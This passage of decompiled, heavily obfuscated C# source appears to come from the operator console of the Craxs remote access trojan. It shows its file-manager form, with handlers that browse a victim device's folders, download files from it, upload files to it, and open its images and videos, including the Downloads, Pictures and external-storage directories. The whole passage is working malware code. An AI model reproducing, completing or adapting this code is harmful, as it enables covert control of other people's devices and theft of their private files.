              int num3 = Operators.CompareString(Left, Right, false) == 0 ? -1105334926 : (num3 = 1600709925);
              num1 = num3 ^ (int) num2 * -297604217;
              continue;
            case 7:
              ((Jector) this).paths_indexs.Add((object) new object[1]
              {
                (object) str
              }, text);
              num1 = (int) num2 * -735593953 ^ -651248065;
              continue;
            case 8:
              int num4 = ((Jector) this).paths_indexs.Contains(text) ? 2011795733 : (num4 = 364645342);
              num1 = num4 ^ (int) num2 * 782052453;
              continue;
            case 9:
              str = index.ToString();
              text = this.pathtxt.Text;
              num1 = (int) num2 * -1470252143 ^ -604721492;
              continue;
            default:
              goto label_13;
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
label_13:
      if (e.RowIndex <= 0)
        goto label_46;
label_14:
      int num5 = 272199546;
label_15:
      string str1;
      string[] strArray;
      object obj;
      string str2;
      object[] ParametersObjects1;
      object[] ParametersObjects2;
      object[] ParametersObjects3;
      object objectValue;
      while (true)
      {
        uint num6;
        switch ((num6 = (uint) -(~num5 + (~(2011575185 * 1509985243) + -1909412180 * 2074939379 + (841766365 - 906281513 + -(-778259589 * 1725663484))))) % 34U)
        {
          case 0:
            int num7;
            num5 = num7 = !this.ISupportedVideo(str1.ToLower()) ? 1124530301 : (num7 = -494781253);
            continue;
          case 1:
            int num8 = e.ColumnIndex < 0 ? 1273198725 : (num8 = -1888792316);
            num5 = num8 ^ (int) num6 * -1139994107;
            continue;
          case 2:
            int num9 = ((Jector) this).classClient == null ? 1749044407 : (num9 = -1679992045);
            num5 = num9 ^ (int) num6 * 672635413;
            continue;
          case 3:
            str2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, (object) EXGuarder.\u003292C0D40), this.DGV0.Rows[e.RowIndex].Cells[1].Value));
            num5 = 72379934;
            continue;
          case 4:
            int num10 = ((Jector) this).classClient == null ? -1971237579 : (num10 = 2139940190);
            num5 = num10 ^ (int) num6 * -1043583138;
            continue;
          case 5:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((Jector) this).classClient.SendMessage(new object[4]
            {
              (object) ((Jector) this).Client,
              Operators.ConcatenateObject((object) (Craxs_Rat.sockets.Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u0033D512605 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0030278750F + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager._Closure\u0024__.getfiles + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00305205234 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA), this.Pnext(Conversions.ToString(this.DGV0.Tag), Conversions.ToString(this.DGV0.Rows[e.RowIndex].Cells[1].Value))),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u00373464C6F),
              (object) ((Jector) this).classClient
            });
            num5 = (int) num6 * 1855933682 ^ -1309800126;
            continue;
          case 6:
            int num11 = (int) Interaction.MsgBox((object) string.Format(((Jector) this).FSize, RuntimeHelpers.GetObjectValue(this.DGV0.Rows[e.RowIndex].Cells[2].Value), RuntimeHelpers.GetObjectValue(this.DGV0.Rows[e.RowIndex].Cells[1].Value)), MsgBoxStyle.Critical, (object) Settings.nameRAT);
            num5 = (int) num6 * -296938267 ^ -1518961874;
            continue;
          case 7:
            int num12;
            num5 = num12 = ((Jector) this).classClient == null ? -6413163 : (num12 = 565875985);
            continue;
          case 8:
            obj = (object) EXGuarder.\u003726E3477;
            num5 = (int) num6 * 1084408688 ^ 1452598684;
            continue;
          case 9:
            ((Jector) this).classClient.SendMessage(ParametersObjects3);
            num5 = (int) num6 * 711548630 ^ -1764967385;
            continue;
          case 10:
            ((Jector) this).classClient.SendMessage(ParametersObjects1);
            num5 = (int) num6 * -1736611296 ^ -1910480219;
            continue;
          case 11:
            int num13 = e.ColumnIndex < 0 ? -40239621 : (num13 = 1029900447);
            num5 = num13 ^ (int) num6 * 578639266;
            continue;
          case 12:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects2 = new object[4]
            {
              (object) ((Jector) this).Client,
              (object) (Craxs_Rat.sockets.Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u0033D512605 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0030278750F + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Craxs_Rat.sockets.Client.editor + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0033D445831 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + str2),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u00373464C6F),
              (object) ((Jector) this).classClient
            };
            num5 = (int) num6 * -1452034687 ^ 448053948;
            continue;
          case 13:
            num5 = (int) num6 * -540465039 ^ -419147496;
            continue;
          case 14:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects3 = new object[4]
            {
              (object) ((Jector) this).Client,
              Operators.ConcatenateObject((object) (Craxs_Rat.sockets.Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u0033D512605 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0030278750F + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager._Closure\u0024__.getfiles + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00305205234 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA), this.Pback(Conversions.ToString(this.DGV0.Tag))),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u00373464C6F),
              (object) ((Jector) this).classClient
            };
            num5 = (int) num6 * 16557938 ^ 569685046;
            continue;
          case 15:
            ((Jector) this).classClient.SendMessage(ParametersObjects2);
            num5 = (int) num6 * -1936562978 ^ 726565719;
            continue;
          case 16:
            num5 = (int) num6 * -315147474 ^ 1729572369;
            continue;
          case 17:
            goto label_14;
          case 18:
            int num14 = Operators.ConditionalCompareObjectLessEqual(objectValue, (object) 512000, false) ? 1989615640 : (num14 = 1355428779);
            num5 = num14 ^ (int) num6 * -763381236;
            continue;
          case 19:
            int num15 = ((Jector) this).classClient == null ? -878740006 : (num15 = 55986853);
            num5 = num15 ^ (int) num6 * -224095703;
            continue;
          case 20:
            goto label_16;
          case 21:
            string Left = Conversions.ToString(this.DGV0.Rows[e.RowIndex].Cells[0].Tag);
            str1 = Conversions.ToString(this.DGV0.Rows[e.RowIndex].Cells[1].Value);
            int num16 = Operators.CompareString(Left, EXGuarder.\u0034335303D, false) != 0 ? 2064924649 : (num16 = 2067952710);
            num5 = num16 ^ (int) num6 * 1102150308;
            continue;
          case 22:
            obj = (object) EXGuarder.\u00373464C6F;
            num5 = 709700188;
            continue;
          case 23:
            goto label_46;
          case 24:
            obj = (object) EXGuarder.\u00373464C6F;
            num5 = 1134297049;
            continue;
          case 25:
            strArray = ((Data) ((Jector) this).classClient).Keys.Split(':');
            num5 = (int) num6 * -33793274 ^ 1482164881;
            continue;
          case 26:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects1 = new object[4]
            {
              (object) ((Jector) this).Client,
              Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) (Craxs_Rat.sockets.Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u0033D512605 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0030278750F + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Craxs_Rat.sockets.Client.resultClient + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003331D6E34 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + str2 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA), obj), (object) Data.VB\u0024StateMachine_39_HandelData.SPL_DATA), (object) ((Jector) this).Q), (object) Data.VB\u0024StateMachine_39_HandelData.SPL_DATA), (object) Accept.ImageViewer), (object) (EXGuarder.\u0036D791E3D + ((Data._Closure\u0024__39\u002D12) ((Jector) this).classClient).UUID)),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u00373464C6F),
              (object) ((Jector) this).classClient
            };
            num5 = (int) num6 * 865692904 ^ -1684487383;
            continue;
          case 27:
            obj = (object) EXGuarder.\u0035C66392B;
            num5 = (int) num6 * 1514682594 ^ -1915452030;
            continue;
          case 28:
            objectValue = RuntimeHelpers.GetObjectValue(this.DGV0.Rows[e.RowIndex].Cells[2].Tag);
            num5 = (int) num6 * 1579516040 ^ -707698489;
            continue;
          case 29:
            int num17 = !this.ISupportedText(str1.ToLower()) ? 359498238 : (num17 = -178553142);
            num5 = num17 ^ (int) num6 * -1172483085;
            continue;
          case 30:
            int num18 = !Operators.ConditionalCompareObjectEqual(this.DGV0.Rows[e.RowIndex].Cells[0].Tag, (object) EXGuarder.\u0032C4F0F4D, false) ? -1142199760 : (num18 = -1974007342);
            num5 = num18 ^ (int) num6 * -513783685;
            continue;
          case 31:
            num5 = (int) num6 * 953784208 ^ -371613403;
            continue;
          case 32:
            int num19 = !this.ISupportedImages(str1.ToLower()) ? -318749161 : (num19 = -916463898);
            num5 = num19 ^ (int) num6 * 524324456;
            continue;
          case 33:
            int num20;
            num5 = num20 = !Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(obj, (object) EXGuarder.\u00373464C6F, false))) ? -6413163 : (num20 = 241865735);
            continue;
          default:
            goto label_11;
        }
      }
label_16:
      return;
label_11:
      return;
label_46:
      num5 = e.RowIndex != 0 ? -6413163 : (num5 = 1028393182);
      goto label_15;
    }

    private object Pback(string p)
    {
      string str = string.Format(EXGuarder.\u003224F646E, (object) p.Substring(0, p.LastIndexOf(EXGuarder.\u00360553956)));
      return str.Contains(EXGuarder.\u00360553956) ? (object) str : (object) EXGuarder.\u00360553956;
    }

    private object Pnext(string p, string n)
    {
      return (object) string.Format(EXGuarder.\u003156D120E, (object) p, (object) n);
    }

    private void DownloadToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this.DGV0.SelectedRows.Count <= 0)
        return;
label_1:
      int num1 = 1686981271;
      int num2;
      string[] strArray;
      string str;
      object[] ParametersObjects;
      int index;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) ~(-num1 * 565216613 * 260540365)) % 12U)
        {
          case 0:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects = new object[4]
            {
              (object) ((Jector) this).Client,
              (object) (Craxs_Rat.sockets.Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u00376114C17 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0031A6B4C4D + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Craxs_Rat.sockets.Client.resultClient + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00368475A56 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + str + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + Accept.down_info + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + Accept.downByte + EXGuarder.\u00300544B5D + ((Data._Closure\u0024__39\u002D12) ((Jector) this).classClient).UUID + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + EXGuarder.\u00300544B5D + ((Data._Closure\u0024__39\u002D12) ((Jector) this).classClient).UUID),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u0036C350344),
              (object) ((Jector) this).classClient
            };
            num1 = (int) num3 * 855052727 ^ 1042488248;
            continue;
          case 1:
            num1 = (int) num3 * -111799446 ^ -1337201113;
            continue;
          case 2:
            goto label_1;
          case 3:
            int num4;
            num1 = num4 = Operators.CompareString(Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Cells[0].Tag), EXGuarder.\u00316253454, false) != 0 ? 1566609890 : (num4 = 531329656);
            continue;
          case 4:
            goto label_14;
          case 5:
            checked { index += -1; }
            num1 = -1920609955;
            continue;
          case 6:
            num2 = checked (this.DGV0.SelectedRows.Count - 1);
            num1 = (int) num3 * 31609658 ^ 1963435938;
            continue;
          case 7:
            str = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, (object) EXGuarder.\u0032F254F71), this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Cells[1].Value));
            int num5 = ((Jector) this).classClient == null ? 176764044 : (num5 = 1226279449);
            num1 = num5 ^ (int) num3 * -414423678;
            continue;
          case 8:
            int num6;
            num1 = num6 = index >= 0 ? 617189396 : (num6 = -1635909327);
            continue;
          case 9:
            index = num2;
            num1 = (int) num3 * -1592427100 ^ -1996461890;
            continue;
          case 10:
            strArray = ((Data) ((Jector) this).classClient).Keys.Split(':');
            num1 = (int) num3 * 288561124 ^ -897140299;
            continue;
          case 11:
            ((Jector) this).classClient.SendMessage(ParametersObjects);
            num1 = (int) num3 * 145483087 ^ -432010073;
            continue;
          default:
            goto label_15;
        }
      }
label_14:
      return;
label_15:;
    }

    private void UploadToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (((Jector) this).classClient == null)
        return;
label_1:
      int num1 = 1084687196;
      string[] strArray1;
      int index;
      string fileName;
      string[] fileNames;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 * -748699511 * 509020707 * 251269543)) % 13U)
        {
          case 1:
            strArray1 = fileNames;
            index = 0;
            num1 = (int) num2 * 576015197 ^ 538358436;
            continue;
          case 2:
            this.FilesUpload.Multiselect = true;
            num1 = (int) num2 * -1191986288 ^ -1048731155;
            continue;
          case 3:
            this.FilesUpload.FileName = string.Empty;
            num1 = (int) num2 * -822316701 ^ 1124549480;
            continue;
          case 4:
            this.FilesUpload.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            this.FilesUpload.Filter = EXGuarder.\u0030F11103B;
            num1 = (int) num2 * 542714438 ^ -1423602148;
            continue;
          case 5:
            if (((Jector) this).classClient != null)
            {
              num1 = (int) num2 * -739081323 ^ -20516506;
              continue;
            }
            goto label_30;
          case 6:
            fileNames = this.FilesUpload.FileNames;
            num1 = (int) num2 * 463640425 ^ 1686782034;
            continue;
          case 7:
            this.FilesUpload.Title = EXGuarder.\u00319453170;
            num1 = (int) num2 * -1431414655 ^ 342561820;
            continue;
          case 8:
            fileName = strArray1[index];
            num1 = (int) num2 * -433084766 ^ -855412121;
            continue;
          case 9:
            if (this.FilesUpload.ShowDialog() == DialogResult.OK)
            {
              num1 = (int) num2 * 61201274 ^ -2033204679;
              continue;
            }
            goto label_35;
          case 10:
label_9:
            if (index < strArray1.Length)
            {
              num1 = -1168620941;
              continue;
            }
            goto label_32;
          case 11:
            goto label_1;
          case 12:
            if (fileNames.Length > 0)
            {
              num1 = (int) num2 * -1939347900 ^ -1126314103;
              continue;
            }
            goto label_23;
          default:
            string[] strArray2 = ((Data) ((Jector) this).classClient).Keys.Split(':');
            try
            {
              FileInfo fileInfo = new FileInfo(fileName);
label_21:
              int num3 = -1112903206;
              string str1;
              string str2;
              string name;
              while (true)
              {
                uint num4;
                switch ((num4 = (uint) (num3 * -748699511 * 509020707 * 251269543)) % 4U)
                {
                  case 1:
                    str2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, (object) EXGuarder.\u00354420F3E), (object) fileInfo.Name));
                    name = fileInfo.Name;
                    num3 = (int) num4 * 2042979568 ^ 492359932;
                    continue;
                  case 2:
                    str1 = Conversions.ToString(fileInfo.Length);
                    num3 = (int) num4 * 85136181 ^ 959386839;
                    continue;
                  case 3:
                    goto label_21;
                  default:
                    goto label_26;
                }
              }
label_26:
              string fullName = fileInfo.FullName;
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              ((Jector) this).classClient.SendMessage(new object[4]
              {
                (object) ((Jector) this).Client,
                (object) (Craxs_Rat.sockets.Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u0030153720B + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0031C6C5019 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Craxs_Rat.sockets.Client.resultClient + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003320C0141 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + strArray2[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + strArray2[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + str2 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + str1 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + name + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + fullName + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + Accept.upload_info + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + Accept.uploadByte),
                (object) Codes.Encoding().GetBytes(EXGuarder.\u0033D49754E),
                (object) ((Jector) this).classClient
              });
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
label_28:
              int num5 = 600369421;
              while (true)
              {
                uint num6;
                switch ((num6 = (uint) (num5 * -748699511 * 509020707 * 251269543)) % 3U)
                {
                  case 0:
                    goto label_28;
                  case 2:
                    ProjectData.ClearProjectError();
                    num5 = (int) num6 * 711801160 ^ -553322178;
                    continue;
                  default:
                    goto label_33;
                }
              }
            }
label_33:
            checked { ++index; }
label_34:
            uint num7;
            switch ((num7 = (uint) (1995373769 * -748699511 * 509020707 * 251269543)) % 3U)
            {
              case 0:
                goto label_34;
              case 1:
                goto label_9;
              case 2:
                goto label_3;
              default:
                goto label_37;
            }
        }
      }
label_35:
      return;
label_32:
      return;
label_30:
      return;
label_23:
      return;
label_3:
      return;
label_37:;
    }

    private void ViewToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this.DGV0.SelectedRows.Count <= 0)
        return;
label_1:
      int num1 = -87445134;
      while (true)
      {
        int num2 = num1;
        uint num3;
        object obj;
        object[] ParametersObjects;
        string[] strArray;
        string str1;
        int index;
        string str2;
        int num4;
        switch ((num3 = (uint) ((-~623936654 ^ -(621493592 - -952714966)) - (1095734179 * (~-354017181 + (-354166964 - 1225872477)) - 1711480991 * (333572795 - 465789097 * -257672901) - (num2 ^ -(1979669299 + (-439723085 - -736500564 - -1171159106)) - ((-1986642242 * -53585333 - (449055829 + 967322336)) * -1401148423 - (398386727 - 1704811698 ^ 1465151773 - -1966686096) * 2057448721))) - (-847691449 - -1718281214))) % 20U)
        {
          case 0:
            str1 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, (object) EXGuarder.\u00352121E38), this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Cells[1].Value));
            str2 = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Cells[1].Value);
            obj = (object) EXGuarder.\u0033E725B1B;
            int num5 = !this.ISupportedImages(str2.ToLower()) ? -962369687 : (num5 = 239819369);
            num1 = num5 ^ (int) num3 * 1129922207;
            continue;
          case 1:
            int num6;
            num1 = num6 = !this.ISupportedVideo(str2.ToLower()) ? -641502176 : (num6 = -694284234);
            continue;
          case 2:
            int num7;
            num1 = num7 = Operators.CompareString(Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Cells[0].Tag), EXGuarder.\u0035925241F, false) != 0 ? 919402390 : (num7 = -728560682);
            continue;
          case 3:
            int num8 = ((Jector) this).classClient == null ? 1395251525 : (num8 = -235515013);
            num1 = num8 ^ (int) num3 * 1627874333;
            continue;
          case 4:
            obj = (object) EXGuarder.\u00347673762;
            num1 = (int) num3 * -54559327 ^ -2137914165;
            continue;
          case 5:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects = new object[4]
            {
              (object) ((Jector) this).Client,
              Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) (Craxs_Rat.sockets.Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u0034F26534A + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00372043F20 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Craxs_Rat.sockets.Client.resultClient + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00302397510 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + str1 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA), obj), (object) Data.VB\u0024StateMachine_39_HandelData.SPL_DATA), (object) ((Jector) this).Q), (object) Data.VB\u0024StateMachine_39_HandelData.SPL_DATA), (object) Accept.ImageViewer), (object) (EXGuarder.\u0036D402A55 + ((Data._Closure\u0024__39\u002D12) ((Jector) this).classClient).UUID)),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u0033E725B1B),
              (object) ((Jector) this).classClient
            };
            num1 = (int) num3 * 1802873529 ^ -316105726;
            continue;
          case 6:
            obj = (object) EXGuarder.\u0033E725B1B;
            num1 = 745026226;
            continue;
          case 7:
            ((Jector) this).classClient.SendMessage(ParametersObjects);
            num1 = (int) num3 * -1916913822 ^ -2131184112;
            continue;
          case 8:
            int num9;
            num1 = num9 = !Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(obj, (object) EXGuarder.\u0033E725B1B, false))) ? 919402390 : (num9 = 597795055);
            continue;
          case 9:
            obj = (object) EXGuarder.\u0036677551E;
            num1 = (int) num3 * 167777062 ^ -1824387513;
            continue;
          case 10:
            num1 = (int) num3 * 769416742 ^ -1912038785;
            continue;
          case 11:
            num1 = (int) num3 * 661224884 ^ -395635378;
            continue;
          case 12:
            num4 = checked (this.DGV0.SelectedRows.Count - 1);
            num1 = (int) num3 * -348677947 ^ 444357097;
            continue;
          case 13:
            num1 = (int) num3 * -1974093390 ^ -173105432;
            continue;
          case 14:
            goto label_22;
          case 15:
            goto label_1;
          case 16:
            checked { index += -1; }
            num1 = 951581459;
            continue;
          case 17:
            index = num4;
            num1 = (int) num3 * 558340666 ^ 858016678;
            continue;
          case 18:
            strArray = ((Data) ((Jector) this).classClient).Keys.Split(':');
            num1 = (int) num3 * 836226438 ^ 1598802473;
            continue;
          case 19:
            int num10;
            num1 = num10 = index >= 0 ? -594552140 : (num10 = -628233788);
            continue;
          default:
            goto label_23;
        }
      }
label_22:
      return;
label_23:;
    }

    private void ExternalStorageDirectoryToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (((Jector) this).classClient == null)
        return;
label_1:
      int num1 = -918496593;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (-~83640198 - ~~(num2 - (--1396268161 ^ ~(~435769844 ^ 1037739411) - (-1638932719 * -438808252 - ~-1143795455) * -216037825)) - (42495207 - 1684977396) - -589181677)) % 3U)
        {
          case 0:
            goto label_5;
          case 1:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((Jector) this).classClient.SendMessage(new object[4]
            {
              (object) ((Jector) this).Client,
              (object) (Craxs_Rat.sockets.Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u003002F6001 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0031169462B + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager._Closure\u0024__.getfiles + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003383F7804 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + EXGuarder.\u0034B002C0C),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u0034E38374F),
              (object) ((Jector) this).classClient
            });
            num1 = (int) num3 * -1541687284 ^ -242829640;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_6;
        }
      }
label_5:
      return;
label_6:;
    }

    private void DirectoryDownloadsToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (((Jector) this).classClient == null)
        return;
label_1:
      int num1 = 1211120762;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (1346314142 - (~(2005726315 - 469756050) - ((num2 - -(-1678709231 * 336771185) ^ 1231852767 ^ -628251385) - (276976738 - 2003731465 + (-1522636718 - 1027910939) + ~(1192870420 ^ 884497034))) - ~-647408716))) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_5;
          case 2:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((Jector) this).classClient.SendMessage(new object[4]
            {
              (object) ((Jector) this).Client,
              (object) (Craxs_Rat.sockets.Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u0035D6B0E67 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00371450074 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager._Closure\u0024__.getfiles + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0032B133071 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + EXGuarder.\u00376126D56),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u0031B3D2C57),
              (object) ((Jector) this).classClient
            });
            num1 = (int) num3 * -1233453275 ^ -436334039;
            continue;
          default:
            goto label_6;
        }
      }
label_5:
      return;
label_6:;
    }

    private void DirectoryPicturesToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (((Jector) this).classClient == null)
        return;
label_1:
      int num1 = -194773982;
      object[] ParametersObjects;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) -((num1 - (1417078487 + (1237851858 - -(546615490 * 1999855803)) - ((-1599498792 ^ ~~-109795886) - 248985248))) * 1674575941)) % 4U)
        {
          case 0:
            ((Jector) this).classClient.SendMessage(ParametersObjects);
            num1 = (int) num2 * -943503913 ^ -1817483216;
            continue;
          case 1:
            goto label_6;
          case 2:
            goto label_1;
          case 3:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects = new object[4]
            {
              (object) ((Jector) this).Client,
